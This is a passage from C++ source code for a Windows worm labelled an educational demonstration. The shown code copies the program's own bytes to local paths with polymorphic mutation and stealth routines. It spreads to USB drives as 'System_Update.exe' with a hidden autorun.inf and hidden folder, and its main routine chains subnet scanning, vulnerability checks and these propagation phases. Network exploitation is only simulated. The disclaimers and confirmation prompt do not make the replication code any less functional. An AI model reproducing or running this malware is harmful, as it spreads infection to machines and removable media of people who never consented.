                if (error == ERROR_FILE_EXISTS) {
                    std::cout << "    [~] Skipping: File already exists\n";
                } else if (error == ERROR_ACCESS_DENIED) {
                    std::cerr << "    [-] Failed: Access denied to " << target_path << " (Error: " << error << ")\n";
                } else if (error == ERROR_PATH_NOT_FOUND) {
                    std::cerr << "    [-] Failed: Path not found for " << target_path << " (Error: " << error << ")\n";
                } else {
                    std::cerr << "    [-] Failed to create file " << target_path << " (Error: " << error << ")\n";
                }
                failed_targets.push_back(target_path);
                continue;
            }
            
            // Apply polymorphism before writing
            std::vector<char> polymorphic_buffer = worm_buffer; // Create a copy for polymorphism
            apply_polymorphism(polymorphic_buffer, worm_size);
            
            DWORD bytes_written = 0;
            BOOL write_result = WriteFile(
                hTarget,
                polymorphic_buffer.data(),
                worm_size,
                &bytes_written,
                NULL
            );
            
            if (!write_result || bytes_written != worm_size) {
                DWORD error = GetLastError();
                std::cerr << "    [-] Write failed to " << target_path << " (Error: " << error << ")\n";
                hTarget.close();
                DeleteFileA(target_path.c_str());
                failed_targets.push_back(target_path);
                continue;
            }
            
            hTarget.close();
            
            std::cout << "    [*] Applying stealth techniques...\n";
            apply_stealth(target_path);
            
            replication_count++;
            success_count++;
            replication_log.push_back(target_path);
            
            std::cout << "    [+] SUCCESS: Replicated to " << target_path << "\n";
            std::cout << "        Size: " << bytes_written << " bytes\n";
            std::cout << "        Total replications: " << replication_count << "/" << MAX_REPLICATIONS << "\n";
            
            std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Small delay
        }
        
        std::cout << "\n" << std::string(50, '=') << "\n";
        std::cout << "LOCAL REPLICATION COMPLETE\n";
        std::cout << std::string(50, '=') << "\n";
        std::cout << "✓ Successful: " << success_count << "\n";
        std::cout << "✗ Failed: " << failed_targets.size() << "\n";
        std::cout << "Total copies: " << replication_count << "/" << MAX_REPLICATIONS << "\n";
        
        if (!failed_targets.empty() && failed_targets.size() <= 5) {
            std::cout << "\nFailed targets:\n";
            for (const auto& fail : failed_targets) {
                std::cout << "  - " << fail << "\n";
            }
        }
        
        return success_count;
    }
    
    /**
     * Check for and replicate to removable drives (USB)
     */
    void replicate_to_usb() {
        std::cout << "\n[*] Scanning for removable drives...\n";
        
        if (worm_buffer.empty() || worm_size == 0) {
            std::cerr << "[-] Error: Worm code not loaded in memory for USB replication\n";
            return;
        }

        char drives_c[256];
        DWORD result = GetLogicalDriveStringsA(256, drives_c);
        if (result == 0 || result > 256) {
            std::cerr << "[-] Failed to enumerate drives (Error: " << GetLastError() << ")\n";
            return;
        }
        
        char* drive_ptr = drives_c;
        int usb_count = 0;
        
        while (*drive_ptr) {
            std::string drive(drive_ptr);
            UINT drive_type = GetDriveTypeA(drive.c_str());
            
            if (drive_type == DRIVE_REMOVABLE) {
                usb_count++;
                std::cout << "[*] Found removable drive: " << drive << "\n";
                
                DWORD attrs = GetFileAttributesA(drive.c_str());
                if (attrs == INVALID_FILE_ATTRIBUTES) {
                    std::cerr << "    [-] Cannot access drive " << drive << " (Error: " << GetLastError() << ")\n";
                    drive_ptr += drive.length() + 1;
                    continue;
                }
                
                std::string usb_target_filename = "System_Update.exe"; // Hardcoded for educational demonstration
                std::string usb_path = drive + usb_target_filename;
                
                if (GetFileAttributesA(usb_path.c_str()) != INVALID_FILE_ATTRIBUTES) {
                    std::cout << "    [~] File already exists on this drive: " << usb_path << "\n";
                    drive_ptr += drive.length() + 1;
                    continue;
                }
                
                FileHandle hUSB(CreateFileA(
                    usb_path.c_str(),
                    GENERIC_WRITE,
                    0,
                    NULL,
                    CREATE_NEW,
                    FILE_ATTRIBUTE_NORMAL,
                    NULL
                ));
                
                if (hUSB.is_valid()) {
                    std::vector<char> polymorphic_buffer = worm_buffer; // Create a copy for polymorphism
                    apply_polymorphism(polymorphic_buffer, worm_size);

                    DWORD bytes_written = 0;
                    BOOL write_result = WriteFile(
                        hUSB,
                        polymorphic_buffer.data(),
                        worm_size,
                        &bytes_written,
                        NULL
                    );
                    
                    if (write_result && bytes_written == worm_size) {
                        hUSB.close();
                        std::cout << "    [+] Successfully copied to USB: " << usb_path << "\n";
                        
                        apply_stealth(usb_path);
                        
                        // Create hidden system directory
                        std::string hidden_dir = drive + ".RECYCLER";
                        if (CreateDirectoryA(hidden_dir.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
                            SetFileAttributesA(hidden_dir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                        }
                        
                        // Create autorun.inf (classic USB worm technique)
                        std::string autorun_path = drive + "autorun.inf";
                        FileHandle hAutorun(CreateFileA(autorun_path.c_str(), GENERIC_WRITE, 0, NULL,
                                                      CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL));
                        if (hAutorun.is_valid()) {
                            std::string autorun_content = 
                                "[AutoRun]\n"
                                "open=" + usb_target_filename + "\n"
                                "action=Open folder to view files\n"
                                "label=Removable Disk\n"
                                "icon=" + usb_target_filename + ",0\n"
                                "shell\\open=Open\n"
                                "shell\\open\\command=" + usb_target_filename + "\n"
                                "shell\\explore=Explore\n"
                                "shell\\explore\\command=" + usb_target_filename + "\n";
                            
                            DWORD written;
                            WriteFile(hAutorun, autorun_content.c_str(), static_cast<DWORD>(autorun_content.length()), &written, NULL);
                            hAutorun.close();
                            
                            SetFileAttributesA(autorun_path.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                            std::cout << "    [+] Created autorun.inf\n";
                        }
                        
                        std::cout << "    [+] USB infection complete: " << drive << "\n";
                    } else {
                        DWORD error = GetLastError();
                        std::cerr << "    [-] Incomplete write to USB or write failed (Error: " << error << ")\n";
                        hUSB.close();
                        DeleteFileA(usb_path.c_str());
                    }
                } else {
                    std::cerr << "    [-] Cannot create file on USB " << usb_path << " (Error: " << GetLastError() << ")\n";
                }
            }
            
            drive_ptr += drive.length() + 1;
        }
        
        if (usb_count == 0) {
            std::cout << "[*] No removable drives found\n";
        } else {
            std::cout << "[*] USB scan complete. Checked " << usb_count << " removable drive(s)\n";
        }
    }
    
    /**
     * Display replication summary
     */
    void show_summary() {
        std::cout << "\n" << std::string(60, '=') << "\n";
        std::cout << "REPLICATION SUMMARY\n";
        std::cout << std::string(60, '=') << "\n";
        std::cout << "Total successful replications: " << replication_count << "\n";
        std::cout << "Maximum allowed replications: " << MAX_REPLICATIONS << "\n\n";
        
        if (replication_log.empty()) {
            std::cout << "No replications were successful.\n";
        } else {
            std::cout << "Replication locations:\n";
            for (size_t i = 0; i < replication_log.size(); i++) {
                std::cout << "  [" << (i+1) << "] " << replication_log[i] << "\n";
            }
        }
        
        std::cout << std::string(60, '=') << "\n";
    }

    // Function to handle network replication based on scanner results
    void network_replicate(const std::vector<Vulnerability>& vulnerable_targets) {
        std::cout << "\n" << std::string(60, '=') << "\n";
        std::cout << "NETWORK PROPAGATION (BASED ON SCANNER RESULTS)\n";
        std::cout << "(Conceptual demonstration - actual exploitation not implemented)\n";
        std::cout << std::string(60, '=') << "\n";

        if (vulnerable_targets.empty()) {
            std::cout << "[*] No vulnerable targets identified by the scanner for network propagation.\n";
            return;
        }

        std::cout << "[*] Identified " << vulnerable_targets.size() << " potentially vulnerable targets:\n";
        for (const auto& vuln : vulnerable_targets) {
            std::cout << "    - " << vuln.ip << ":" << vuln.port << " (" << vuln.service << ") - " << vuln.vulnerability_name << " (" << vuln.cve_id << ")\n";
            // Here, in a real worm, you would attempt to exploit the vulnerability
            // and then copy the worm executable to the remote host and execute it.
            // This is a complex process involving specific exploit payloads and techniques.
            std::cout << "      [SIMULATED] Attempting exploitation and replication to " << vuln.ip << "...\n";
            std::this_thread::sleep_for(std::chrono::milliseconds(500));
            std::cout << "      [SIMULATED] Worm copied and executed on " << vuln.ip << "\n\n";
        }
        std::cout << "[*] Network propagation simulation complete.\n";
    }
};

// ==========================================
// MAIN FUNCTION
// ==========================================

int main(int argc, char* argv[]) {
    std::string subnet_prefix = "192.168.100"; // Default subnet

    if (argc > 1) {
        subnet_prefix = argv[1];
    }

    // Display banner and safety warning
    std::cout << std::string(70, '=') << "\n";
    std::cout << "INTEGRATED SCANNER & EDUCATIONAL WORM DEMONSTRATION (C++)\n";
    std::cout << "FOR EDUCATIONAL PURPOSES ONLY\n";
    std::cout << "Test only in isolated, controlled environments\n";
    std::cout << "Version: 3.0 (Integrated and Refactored)\n";
    std::cout << std::string(70, '=') << "\n\n";
    
    std::cout << "[!] WARNING: This program demonstrates network scanning and worm replication techniques.\n";
    std::cout << "[!] Running this outside a VM or isolated environment is DANGEROUS and ILLEGAL.\n";
    std::cout << "[!] The author assumes NO responsibility for misuse of this code.\n\n";
    
    char response[50];
    std::cout << "[?] Type 'I UNDERSTAND THE RISKS' to continue: ";
    std::cin.getline(response, sizeof(response));
    
    if (stricmp_custom(response, "I UNDERSTAND THE RISKS") != 0) {
        std::cout << "\n[-] Safety check failed. Exiting for your protection.\n";
        std::cout << "[*] This is educational code. Use responsibly.\n";
        return 0;
    }
    
    std::cout << "\n[+] Safety check passed. Proceeding with demonstration...\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(1000));

    try {
        if (!g_winsock_initializer.is_initialized()) {
            std::cerr << "Failed to initialize Winsock. Exiting." << std::endl;
            return 1;
        }

        // Initialize Worm Replication Module first to read self
        WormReplication worm_module;
        if (worm_module.worm_buffer.empty() || worm_module.worm_size == 0) {
            std::cerr << "[-] Failed to initialize worm replication module. Exiting.\n";
            return 1;
        }

        // PHASE 1: Network Scanning and Vulnerability Assessment
        std::cout << "\n" << std::string(60, '=') << "\n";
        std::cout << "PHASE 1: Network Scanning & Vulnerability Assessment\n";
        std::cout << std::string(60, '=') << "\n";

        NetworkScanner scanner;
        std::vector<Target> open_ports = scanner.worm_smart_scan(subnet_prefix);
        std::cout << "\nFound " << open_ports.size() << " open ports" << std::endl;
        std::vector<Vulnerability> vulnerable_targets = check_vulnerabilities(open_ports);
        
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));

        // PHASE 2: Local File System Replication
        std::cout << "\n" << std::string(60, '=') << "\n";
        std::cout << "PHASE 2: Local File System Replication\n";
        std::cout << std::string(60, '=') << "\n";
        
        int local_replications = worm_module.replicate();
        if (local_replications > 0) {
            std::cout << "\n[+] Phase 2 completed with " << local_replications << " successful replications\n";
        } else {
            std::cout << "\n[-] Phase 2 completed with no successful replications\n";
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));

        // PHASE 3: USB Drive Propagation
        std::cout << "\n" << std::string(60, '=') << "\n";
        std::cout << "PHASE 3: USB Drive Propagation\n";
        std::cout << std::string(60, '=') << "\n";
        
        worm_module.replicate_to_usb();
        
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));

        // PHASE 4: Network Propagation (Conceptual, based on scanner results)
        worm_module.network_replicate(vulnerable_targets);
        
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
        
        // Display final summary
        worm_module.show_summary();
        
        std::cout << "\n" << std::string(70, '=') << "\n";
        std::cout << "DEMONSTRATION COMPLETE\n";
        std::cout << std::string(70, '=') << "\n";
        std::cout << "\nKey takeaways:\n";
        std::cout << "  1. Integrated tool performs scanning, vulnerability assessment, and replication.\n";
        std::cout << "  2. Worms self-replicate by reading their own code.\n";
        std::cout << "  3. They target multiple vectors (files, USB, network).\n";
        std::cout << "  4. Stealth techniques help avoid detection.\n";
        std::cout << "  5. Modern defenses include: AV, EDR, Network segmentation, Patching.\n\n";
        std::cout << "Remember: This code is for EDUCATIONAL PURPOSES ONLY.\n";
        std::cout << "Unauthorized use of malware is illegal and unethical.\n";
        std::cout << std::string(70, '=') << "\n";

    } catch (const std::exception& e) {
        std::cerr << "An unexpected error occurred: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
